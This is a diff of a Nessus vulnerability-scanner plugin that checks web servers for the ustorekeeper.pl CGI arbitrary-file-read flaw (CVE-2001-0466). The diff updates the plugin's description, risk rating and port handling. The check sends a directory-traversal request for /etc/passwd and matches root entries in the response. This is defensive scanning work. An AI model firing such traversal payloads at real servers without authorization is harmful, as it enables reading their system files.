@@ -7,50 +7,53 @@
 if(description)
 {
  script_id(10645);
- script_version ("$Revision: 1.11 $");
- script_cve_id("CAN-2001-0466");
  script_bugtraq_id(2536);
+ script_version ("$Revision: 1.17 $");
+ script_cve_id("CVE-2001-0466");
 
- name["english"] = "ustorekeeper";
- name["francais"] = "ustorekeeper";
- script_name(english:name["english"], francais:name["francais"]);
+ name["english"] = "ustorekeeper file reading";
+ script_name(english:name["english"]);
  
- desc["english"] = "The 'ustorekeeper.pl' CGI is installed. This CGI has
-a well known security flaw that lets an attacker read arbitrary
-files with the privileges of the http daemon (usually root or nobody).
+ desc["english"] = "
+Synopsis :
 
-Solution : remove 'ustorekeeper.pl' from /cgi-bin or upgrade to the latest version.
+The remote web server contains a CGI script that allows reading
+arbitrary files.
 
-Risk factor : Serious";
+Description :
 
+The 'ustorekeeper.pl' CGI script installed on the remote host allows
+an attacker to read arbitrary files subject to the privileges of the
+http daemon (usually root or nobody). 
 
- desc["francais"] = "Le cgi 'ustorekeeper.pl' est installé. Celui-ci possède
-un problème de sécurité bien connu qui permet à n'importe qui de 
-faire lire des fichiers  arbitraires au daemon http, avec les privilèges
-de celui-ci (root ou nobody). 
+See also :
 
-Solution : retirez-le de /cgi-bin ou mettez-le à jour 
+http://marc.theaimsgroup.com/?l=bugtraq&m=98633176230748&w=2
 
-Facteur de risque : Sérieux";
+Solution : 
 
+Remove the CGI script.
 
- script_description(english:desc["english"], francais:desc["francais"]);
+Risk factor : 
+
+Medium / CVSS Base Score : 4 
+(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:C)";
+
+ script_description(english:desc["english"]);
  
- summary["english"] = "Checks for the presence of /cgi-bin/ustorekeeper.pl";
- summary["francais"] = "Vérifie la présence de /cgi-bin/ustorekeeper.pl";
- 
- script_summary(english:summary["english"], francais:summary["francais"]);
+ summary["english"] = "Checks for the presence of ustorekeeper.pl";
+
+ script_summary(english:summary["english"]);
  
  script_category(ACT_GATHER_INFO);
  
  
- script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
-		francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
+ script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison");
  family["english"] = "CGI abuses";
- family["francais"] = "Abus de CGI";
- script_family(english:family["english"], francais:family["francais"]);
- script_dependencie("find_service.nes", "no404.nasl");
+ script_family(english:family["english"]);
+ script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
+ script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
 }
 
@@ -60,15 +63,14 @@ Facteur de risque : Sérieux";
 include("http_func.inc");
 include("http_keepalive.inc");
 
-port = get_kb_item("Services/www");
-if(!port) port = 80;
+port = get_http_port(default:80);
 if(!get_port_state(port))exit(0);
 
 foreach dir (cgi_dirs())
 {
  req = string(dir, "/ustorekeeper.pl?command=goto&file=../../../../../../../../../../etc/passwd");
  req = http_get(item:req, port:port);
- r = http_keepalive_send_recv(port:port, data:req);
+ r = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if( r == NULL ) exit(0);
- if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))security_hole(port);
+ if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))security_warning(port);
 }
